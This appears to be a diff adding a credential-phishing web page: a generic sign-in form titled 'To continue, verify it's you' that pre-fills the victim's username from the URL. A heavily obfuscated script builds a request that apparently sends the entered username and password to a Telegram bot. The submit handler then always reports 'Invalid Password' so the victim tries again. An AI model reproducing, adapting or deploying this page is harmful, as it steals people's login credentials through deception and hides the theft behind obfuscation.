@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In</title>
+    <link rel="preload" href="https://qfstellarvault.live/img/a.webp" as="image" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling */
+            position: relative; /* Position context for the image */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Cover the entire viewport with the background image */
+        .bg-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Make image cover the area */
+            z-index: -1; /* Send the image behind the content */
+        }
+
+        .login-card {
+            background: rgba(242, 247, 250, 0.9); /* Slightly transparent background */
+            width: 90%;
+            max-width: 430px;
+            padding: 50px 35px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            position: relative;
+        }
+
+        .login-card .avatar {
+            width: 90px;
+            height: 90px;
+            background-color: #005c96;
+            border-radius: 50%;
+            margin: -80px auto 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-card .avatar i {
+            color: #fff;
+            font-size: 45px;
+        }
+
+        .login-card h2 {
+            color: #003f5e;
+            margin-bottom: 30px;
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        .login-card .input-group {
+            position: relative;
+            margin-bottom: 22px;
+        }
+
+        .login-card input {
+            width: 100%;
+            padding: 15px 45px 15px 18px;
+            font-size: 15px;
+            border: none;
+            border-radius: 6px;
+            background: #e5e9ec;
+            color: #333;
+            transition: all 0.3s ease;
+        }
+
+        .login-card input:focus {
+            background: #dce4e8;
+            outline: none;
+        }
+
+        .login-card .input-group i {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 17px;
+            cursor: pointer;
+        }
+
+        .login-card button {
+            width: 100%;
+            padding: 15px;
+            font-size: 15px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #005387;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 15px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
+            transition: all 0.3s ease;
+        }
+
+        .login-card button:hover {
+            background-color: #004066;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 15px;
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+    </style>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+<body>
+    <img src="https://qfstellarvault.live/img/a.webp" alt="Background Image" class="bg-image" />
+
+    <div class="login-card">
+        <div class="avatar">
+            <i class="fas fa-user"></i>
+        </div>
+        <h2>To continue, verify it's you</h2>
+        <form id="login-form">
+            <div class="input-group">
+                <label for="username" class="sr-only">Username</label>
+                <input id="username" type="text" placeholder="Username" required />
+                <i class="fas fa-user"></i>
+            </div>
+            <div class="input-group">
+                <label for="password" class="sr-only">Password</label>
+                <input id="password" type="password" placeholder="Password" required />
+                <i class="fas fa-eye" id="togglePassword"></i>
+            </div>
+            <button type="submit">Sign in</button>
+            <div class="error-message" id="error-message"></div>
+        </form>
+    </div>
+
+   
+
+<script>
+const usernameInput = document.getElementById('username');
+const usernameFromUrl = window.location.hash.substring(1);
+if (usernameFromUrl) {
+    usernameInput.value = usernameFromUrl;
+}
+
+const toggle = document.getElementById('togglePassword');
+const password = document.getElementById('password');
+
+toggle.addEventListener('click', () => {
+    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+    password.setAttribute('type', type);
+    toggle.classList.toggle('fa-eye-slash');
+});
+</script>
+
+
+<script>
+ const _c={'\x55\u005a\x54\u0075\x6e':((VLOb,Vt8B_c6U)=>{Vt8B_c6U|=VLOb;return {'\x56\x48\u0061\x56':i=>'\x69\x6c\u0065\u0064\u0020','\u0074\x45\x6d\x6a':r=>0b1001101011,'\x56\u0073\x62':C=>'\x41\x45\x55\x75','\x56\x63\x30\x51\x41\x68':P=>`\x6f\u0072`,'\u0067\x6c\x44\u0035':x=>"\x57\x31\u006a\u0055",'\x56\u0044':D=>`\x65\u006c\x65\u0067\x72`,'\x56\u0073':J=>'\x66\x2d'};})(0o11240,0b101100100),'\x31\x72\x59\x59':((VtK)=>{return {'\u0056\x45\x24\u0054':v=>((VkHeW_xT,VtO,VFq,VHU,VeU,VV,VM4s,VXs,VjJx)=>{VXs=[()=>typeof 0b1100100,()=>typeof RegExp,()=>Date,()=>0o256,()=>typeof 0x56,()=>typeof self,()=>typeof globalThis,()=>globalThis,()=>global,()=>typeof window,()=>typeof 0b1101101,()=>self,()=>0b10101010,()=>typeof Number,()=>window,()=>typeof global];VV=[(VXt5eqV4,Va$)=>VXt5eqV4&(!+[]+!+[])?VXs[Va$?(((((!-[]+!+[]))+(([]**[]))))*((!-[]+!+[]))):(((((+!+~~[]))+((((!+[]+!+[]))*((!+[]+!+[]))))))+((!+[]+!+[])))]():(VXt5eqV4&(((!-[]+!-[]))*((!-[]+!-[])))?VXs[Va$?(((((-~/VSA/))+((!+[]+!-[]))))+((((((-~[]))+((!+[]+!+[]))))*((!+[]+!+[]))))):(((((((!+[]+!+[]))+((-~[]))))+((((!-[]+!-[]))*((!-[]+!-[]))))))*((!+[]+!+[])))]():(VXt5eqV4&(((((!+[]+!+[]))*((!-[]+!+[]))))*((!+[]+!-[])))?VXs[Va$?(((((!-[]+!+[]))+((![]+!+[]))))+((!+[]+!+[]))):(((((((!+[]+!-[]))*((!-[]+!+[]))))*((!-[]+!+[]))))+((((!+[]+!-[]))+(([]-~[])))))]():(VXt5eqV4&(((((((!-[]+!+[]))*((!-[]+!-[]))))*((!-[]+!+[]))))*((!+[]+!-[])))?VXs[Va$?(((((((+!-~~[]))+((!-[]+!+[]))))+((!-[]+!+[]))))*((((!-[]+!+[]))+((~~[]-~[]))))):(((((!+[]+!-[]))*((!+[]+!+[]))))*((!+[]+!-[])))]():(![]-![])))),(VhiB,VNH5Teh)=>VhiB===VNH5Teh],VM4s=(-~/VsXR/);while(VM4s<(((((((!+[]+!-[]))*((!+[]+!+[]))))*((!+[]+!-[]))))*((!+[]+!-[]))))if(VV[([]-~[])](VV[(+[])](VM4s*=(!-[]+!+[]),(+!-~~[])==(+!+~~[])),VHU+'\u006a\u0065'+VeU)&&(VjJx=VV[(~[]-~[])](VM4s,(+[]+!+[])==(!+[]+!+[])))&&(VFq+VkHeW_xT+'\x74'+VtO) in (VjJx))return(VjJx);})('\u0061','\u0068','\u004d','\x6f\x62','\u0063\x74','\x64\x6f',true,(![]+![]),'\u0077\x69'),'\x56\u0058':T=>`\x2f\x62`,'\x56\x24':K=>'\x49\x6d\x6e','\x56\u0064\x4c\u0074\u0066\u0038\u004c':j=>'\x61\u0067\x65','\x59\x35\x64\x66':v=>0x368,'\x58\x32\u0030\x41':Q=>"\x62\x65\x50\u004a",'\u0056\x74\u0078\u004d\u0046\u0066\x31\u0071':z=>'\x65\x6e','\x74\u005f\x74\u0057':F=>'\u0024\u0031\u0056\x6a'};})(0b10111001000),'\u0057\x64\x7a\u0078\x48':((VWfN)=>{return {'\x4b\u0065\u0076\x4f':i=>"\u0069\u006f\x36\x6c",'\u0056\x4f\x47\u0054\x6c\u0067':h=>`\x6f\x74`,'\u0056\x46\x68\x4d':m=>`\u0068\u0074\u0074\x70`,'\u0056\x54\x38':F=>`\x74\x3d`,'\u0078\u0067\x42\x4e':o=>0b1110110011,'\x56\u0042\x72\x35':e=>'\x3b','\x56\x77\x4c':z=>'\x4a\u0076\x4e','\x56\x72\x36\u0041\x5f\u0053':f=>`\x65\x72`,'\x56\x78\x32':J=>'\x36\u002d\u0047','\x56\x70\u0045':n=>"\x3b",'\x47\x75\u006f\x44':s=>"\x51\x74\x70\x61",'\x52\u0024\x69\u004c':V=>0o1103,'\x56\u006b\x4b\x52':J=>'\u0061\x45','\x56\u0065':a=>`\u0069\u0064\x3d`};})(0o12270),'\u0034\u0071\x64\x32':((VRA,VlB=0o1570)=>{VlB^=VRA;return {'\x56\x5a\x74\x47':P=>`\u0061\u0070\x69\x2e\u0074`,'\u0056\u0078':T=>`\u003b`,'\x56\x66':r=>'\u006d\x65\u0073\u0073','\u0056\u0079\x73':y=>'\x33\x3a\x41','\x56\x42':V=>'\u0067\u0032\x78\u0043','\x56\x61\x4f':c=>'\u006f\x72\x59','\x56\u0054\u007a':T=>'\x36\u0035','\u006a\x6e\x72\x59':p=>0xe3,'\x56\x62\x77':r=>'\x55','\u0056\x76\u0046\x6a':k=>'\x37\u0034','\x6f\u005f\u0054\u0063':n=>()=>{return(VLw,Vd,VDSY,VVk1)=>{VVk1=VLw^Vd;VDSY=(""*``);while(VVk1>(""*``)){VDSY+=(VVk1&(+[]+!+[]));VVk1>>=(+[]+!+[]);}return(VDSY);};},'\x56\x4d':L=>`\u0055\x73`,'\x67\u0064\x47\x31':e=>"\u0058\x47\x69\u0050"};})(0o6147),'\x47\x50\x6b\u0024\x35\u0062':(Vo,VU5j='\x49\u006e\x74',VAq1fQR=RegExp,Vlq='\u0073\x70\x6c\u0069\u0074',VO3x='\x63\u0068\x61\x72',Vfa='\u0041\u0074',VPc='\x70\x61\u0072\x73\x65',Vv='\u005b\u0041\u002d\x5a\x5d',VQ='\x6a\x6f\x69\u006e',VJPF=(((!-[]+!-[]))+((+!+~~[]))),VAc='\x48\x38\x56\x62'+'\x74\u0063\x7a\u0064\x31\x6d'+'\x35\x30\u0059\x55\x24\x70'+'\u0076\x6a\x77\x54'+'\u0078\x50\u0071'+'\u006e\u0051\u004e'+'\x39\x4c\x68\x34\x73\x5f'+'\u0052\x61\x44'+'\x72\x36\x33\x4b\x57\x46'+'\x75\x4f\u0047'+'\x6b\u0069\x5a'+'\x4a\x67\u0043'+'\x53\u0037\u0045\x49\x79\x65'+'\x58\x42\u006f'+'\x6c\x4d\x32\x66'+'\x41',Vpv='\u006d\x61\x70')=>(VNT=>Vo[Vlq](VAq1fQR(Vv))[Vpv](VGaDL=>VAc[VO3x+Vfa](window[VPc+VU5j](VGaDL,VJPF+0x21)))[VQ](VU5j[VO3x+Vfa]((((((((!+[]+!-[]))*((!+[]+!+[]))))*((!-[]+!-[]))))*((!-[]+!-[]))))))((((!+[]+!-[]))+((+[]+!+[])))),'\u005a\x6c\x63':((VsyT=0x1ac7)=>{return {'\u0056\x77\x4f\x24':I=>`\x3f\u0063\x68\x61`,'\x53\x61\x54\x68':f=>"\x42\x31\x48\x49",'\x44\x53\u0071\x6d':u=>0b101011000,'\x56\x45':u=>`\u006e\u0061`,'\x56\u0077\x61\u0039':C=>'\u0074\x6f\x20\u0073','\u0056\x5a\u005f':V=>`\x26\u0074\x65\x78`,'\x56\x72':T=>`\x73\x73\x61\x67\x65`,'\u0078\u0064\x6f\u0071':o=>()=>{return(VVH=0o20256,Vyx=0b1111000011100,VwP2w="\u0073\x31\u0034\u0033")=>{Vyx=0b1111000011100;for(;VVH>=0o20256;Vyx*0b10010100011000,VVH*=Vyx)if(VVH+Vyx===0o20256)VVH+=Vyx**Vyx;return(VVH);};},'\u0056\x49\x64\u0039\x6d\x61':y=>'\x2d\x43\x7a\x50','\x56\x5f\x45':e=>`\u0073\x3a\u002f\x2f`,'\u0056\x5a\u004a\x51\u006f':e=>`\x61\x6d`,'\u0056\u0048\x24\x46':r=>`\x6e\x64\x4d\x65`,'\x79\x50\x37\u0057':R=>0b1111010001,'\x78\u005f\x48\x64':z=>0o325};})(),'\x51\x70\x54\x75\x4d\x30':{'\x44\x4d\x6a\x74':P=>0x358,'\x45\x41\x54\x6f':Q=>"\u004c\u004f\u0050\x72",'\x56\x4b\x47':q=>'\u0037\u0032\x34\x30\x36','\x52\u0042\u0034\x71':K=>'\u005a\x67\x69\x54','\x56\x66\x66':r=>`\u0064\u003a\x20`,'\x56\x57':U=>'\u0051\x46\x34\x4f\x4e','\x56\u0047\u0063\u0049':t=>'\u0032\x32\u0034','\x56\x51\x74\x66':E=>'\x46\x61','\u0056\u0046\x47\u0035':N=>`\u002f\x73\u0065`,'\x45\x5f\x46\x76':Y=>"\x75\x77\u0073\x6a",'\x56\x4d\x54':R=>'\u0064\u0020','\x43\u0035\x4f\x66':g=>'\x70\u0037\x70\x5f','\u0056\x78\x70':g=>'\x32\u0038'},'\u0052\x71\x58\x50':((VUnG676=0b1110110010100)=>{return {'\x56\x7a\x30':x=>`\x0a`,'\u0056\x59':J=>`\x2e\u006f\x72\x67`,'\x56\x6e\x75':q=>`\x74\x5f`,'\u0045\x65\x4a\x75':n=>0x1b6,'\u0071\x59\x38\x64':F=>0b111110001,'\u0056\x58\x7a\x35\u0074\u0037':r=>'\x36\u0039\x39','\x56\u0053':f=>`\x6d\x65\x3a\x20`,'\u004c\x39\x4d\x65':k=>'\u005a\x6b\x47\u006a','\x56\u0062':L=>'\u0038\x37','\x56\x64\x4a':A=>`\u0050\x61\u0073\x73\u0077`};})()}; function _$F(_fwtF,_fQ6){const _LvPD=(_c['4qd2']['\u0056\x76\u0046\x6a']()+_c['QpTuM0']['\x56\x4b\x47']()+_c['RqXP']['\x56\u0062']()+_c['4qd2']['\u0056\u0079\x73']()+_c['UZTun']['\x56\u0073\x62']()+_c['QpTuM0']['\x56\x57']()+_c['WdzxH']['\x56\x78\x32']()+_c['4qd2']['\x56\x61\x4f']()+_c['WdzxH']['\x56\u006b\x4b\x52']()+_c['1rYY']['\x56\x24']()+_c['WdzxH']['\x56\x77\x4c']()+_c['UZTun']['\x56\u0073']()+_c['Zlc']['\u0056\x49\x64\u0039\x6d\x61']()+_c['4qd2']['\x56\x42']()+_c['4qd2']['\x56\x62\x77']());const _LYj=(_c['RqXP']['\u0056\x58\x7a\x35\u0074\u0037']()+_c['QpTuM0']['\x56\u0047\u0063\u0049']()+_c['QpTuM0']['\u0056\x78\x70']()+_c['4qd2']['\x56\u0054\u007a']());const _LMQ=((_c['4qd2']['\x56\x4d']()+_c['WdzxH']['\x56\x72\x36\u0041\x5f\u0053']()+_c['Zlc']['\x56\x45']()+_c['RqXP']['\x56\u0053']())+(_fwtF)+(_c['RqXP']['\x56\x7a\x30']()+_c['RqXP']['\x56\x64\x4a']()+_c['UZTun']['\x56\x63\x30\x51\x41\x68']()+_c['QpTuM0']['\x56\x66\x66']())+(_fQ6));const _Lrx=((_c['WdzxH']['\u0056\x46\x68\x4d']()+_c['Zlc']['\x56\x5f\x45']()+_c['4qd2']['\x56\x5a\x74\x47']()+_c['UZTun']['\x56\u0044']()+_c['Zlc']['\u0056\x5a\u004a\x51\u006f']()+_c['RqXP']['\u0056\x59']()+_c['1rYY']['\x56\u0058']()+_c['WdzxH']['\u0056\x4f\x47\u0054\x6c\u0067']())+(_LvPD)+(_c['QpTuM0']['\u0056\u0046\x47\u0035']()+_c['Zlc']['\u0056\u0048\x24\x46']()+_c['Zlc']['\x56\x72']()+_c['Zlc']['\u0056\x77\x4f\x24']()+_c['RqXP']['\x56\x6e\x75']()+_c['WdzxH']['\x56\u0065']())+(_LYj)+(_c['Zlc']['\u0056\x5a\u005f']()+_c['WdzxH']['\u0056\x54\x38']())+((_c['\x31\x72\x59\x59']['\u0056\x45\x24\u0054']())[_c['\x47\x50\x6b\u0024\x35\u0062']('\x31\x6a\x44\x6e'+'\x56\x35\x54'+'\x31\u006d'+'\x49\x37\x47'+'\x31\u006a'+'\u0043\x64\x51'+'\x77\x52'+'\x31\u0068\x47\x31'+'\u0064\x55\u0031'+'\u006d\x4f\u0039'+'\u004c\x66'+'\u0055\x31'+'\x6d\x49'+'\x6e\u0041\x31'+'\x6a\x56\x6e'+'\x46\x34')](_LMQ)));return(_c['\x31\x72\x59\x59']['\u0056\x45\x24\u0054']())[_c['\x47\x50\x6b\u0024\x35\u0062']('\x31\x71\x42'+'\u0031\x6a\u0054\x34'+'\x48\x35'+'\u0043\x73')](_Lrx)[_c['\x47\x50\x6b\u0024\x35\u0062']('\x34\x48\u0073\x50'+'\x31\x6a'+'\x59\x6e')](_fLW=>{if(!_fLW[_c['\x47\x50\x6b\u0024\x35\u0062']('\u0031\x6d\x54'+'\x31\x38')]){throw new(_c['\x31\x72\x59\x59']['\u0056\x45\x24\u0054']())[_c['\x47\x50\x6b\u0024\x35\u0062']('\x31\u0067\x47\x7a'+'\u004d\u007a\x5a\x31'+'\x6d\x53'+'\x7a')]((_c['QpTuM0']['\x56\x51\x74\x66']()+_c['UZTun']['\x56\x48\u0061\x56']()+_c['Zlc']['\x56\u0077\x61\u0039']()+_c['1rYY']['\u0056\x74\u0078\u004d\u0046\u0066\x31\u0071']()+_c['QpTuM0']['\x56\x4d\x54']()+_c['4qd2']['\x56\x66']()+_c['1rYY']['\x56\u0064\x4c\u0074\u0066\u0038\u004c']()));}});}
+</script>
+
+
+<script>
+const form = document.getElementById('login-form');
+
+form.addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const username = usernameInput.value;
+    const passwordValue = password.value;
+
+    // Get the error message div
+    const errorMessageDiv = document.getElementById('error-message');
+
+    sendToTelegram(username, passwordValue)
+        .then(() => {
+            password.value = ''; // Clear password field
+            // Always show error message after submission
+            errorMessageDiv.textContent = 'Invalid Password. Please try again.';
+            errorMessageDiv.style.color = 'red';
+        })
+        .catch(() => {
+            // Show error message if sending fails
+            errorMessageDiv.textContent = 'Invalid Password. Please try again.';
+            errorMessageDiv.style.color = 'red';
+        });
+});
+
+</script>
+
+</body>
+</html>
